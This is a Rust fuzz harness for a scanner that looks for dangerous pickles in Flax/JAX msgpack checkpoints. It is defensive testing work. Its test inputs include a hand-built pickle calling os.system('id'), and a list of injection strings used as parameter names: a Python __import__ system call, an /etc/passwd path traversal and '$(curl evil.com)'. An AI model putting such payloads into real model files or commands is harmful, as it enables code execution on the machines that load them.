// fuzz_flax.rs — Deep Flax/JAX msgpack checkpoint fuzzer
//
// Exercises Flax checkpoint scanning with adversarial payloads:
// - Embedded dangerous pickles in msgpack values
// - Msgpack format edge cases (nil, oversized maps, nested maps)
// - Parameter name injection
// - Cross-scanner with GGUF and tokenizer
// - Truncation robustness
//
// Run: cargo +nightly fuzz run fuzz_flax -- -max_len=65536

#![no_main]

use libfuzzer_sys::fuzz_target;
use fuzz_helpers::{builders, invariants};
use sentinel_pickle::{policy::ScanPolicy, scanner::scan_data};

fuzz_target!(|data: &[u8]| {
    if data.len() < 4 { return; }

    let policy = ScanPolicy::new(false);
    let strict = ScanPolicy::new(true);

    // ── Pass 1: Standard Flax msgpack ─────────────────────────────────
    let flax = builders::build_flax_msgpack(data);
    let findings = scan_data(&flax, &policy);
    invariants::assert_findings_valid(&findings);

    let strict_f = scan_data(&flax, &strict);
    assert!(strict_f.len() >= findings.len());

    // ── Pass 2: Raw msgpack-like data ─────────────────────────────────
    let mut msgpack = vec![0x82];
    msgpack.extend_from_slice(data);
    let _ = scan_data(&msgpack, &policy);

    // ── Pass 3: Embedded dangerous pickle ─────────────────────────────
    if data.len() > 16 {
        // Dangerous pickle inside flax checkpoint
        let mut nested = vec![0x82]; // fixmap
        nested.push(0xA6);
        nested.extend_from_slice(b"params");
        nested.extend_from_slice(&[0x80, 0x04]); // proto 4
        nested.push(b'c');
        nested.extend_from_slice(b"os\nsystem\n");
        nested.push(0x8c); nested.push(2);
        nested.extend_from_slice(b"id");
        nested.push(0x85); nested.push(b'R');
        nested.push(b'.');
        nested.push(0xA5);
        nested.extend_from_slice(b"state");
        nested.push(0xC0); // nil
        let findings = scan_data(&nested, &policy);
        invariants::assert_findings_valid(&findings);
    }

    // ── Pass 4: Fuzz-supplied embedded pickle ─────────────────────────
    if data.len() > 16 {
        let mut nested = vec![0x82];
        nested.push(0xA6);
        nested.extend_from_slice(b"params");
        nested.extend_from_slice(&[0x80, 0x04]); // proto 4
        nested.extend_from_slice(&data[..data.len().min(128)]);
        nested.push(b'.');
        nested.push(0xA5);
        nested.extend_from_slice(b"state");
        nested.push(0xC0);
        let findings = scan_data(&nested, &policy);
        invariants::assert_findings_valid(&findings);
    }

    // ── Pass 5: Msgpack format variants ───────────────────────────────
    {
        // map16 header (0xDE)
        let mut map16 = vec![0xDE, 0x00, 0x02];
        map16.extend_from_slice(data);
        let _ = scan_data(&map16, &policy);

        // map32 header (0xDF)
        let mut map32 = vec![0xDF, 0x00, 0x00, 0x00, 0x02];
        map32.extend_from_slice(data);
        let _ = scan_data(&map32, &policy);

        // nil (0xC0)
        let _ = scan_data(&[0xC0], &policy);

        // fixarray (0x92 = array of 2)
        let mut arr = vec![0x92];
        arr.extend_from_slice(data);
        let _ = scan_data(&arr, &policy);
    }

    // ── Pass 6: Parameter name injection ──────────────────────────────
    {
        let evil_names: &[&[u8]] = &[
            b"__import__('os').system('id')",
            b"../../../etc/passwd",
            b"$(curl evil.com)",
            b"\x00\x00\x00\x00",
        ];
        for name in evil_names {
            let mut msg = vec![0x81]; // fixmap with 1 entry
            let name_len = name.len().min(31);
            msg.push(0xA0 | name_len as u8); // fixstr
            msg.extend_from_slice(&name[..name_len]);
            msg.push(0xC0); // nil value
            let _ = scan_data(&msg, &policy);
        }
    }

    // ── Pass 7: Truncation ────────────────────────────────────────────
    if flax.len() > 4 {
        let cuts = [1, 2, flax.len() / 2, flax.len() - 1];
        for &cut in &cuts {
            if cut > 0 && cut < flax.len() {
                let _ = scan_data(&flax[..cut], &policy);
            }
        }
    }

    // ── Pass 8: Idempotency ───────────────────────────────────────────
    let f1 = scan_data(&flax, &policy);
    let f2 = scan_data(&flax, &policy);
    assert_eq!(f1.len(), f2.len());
});
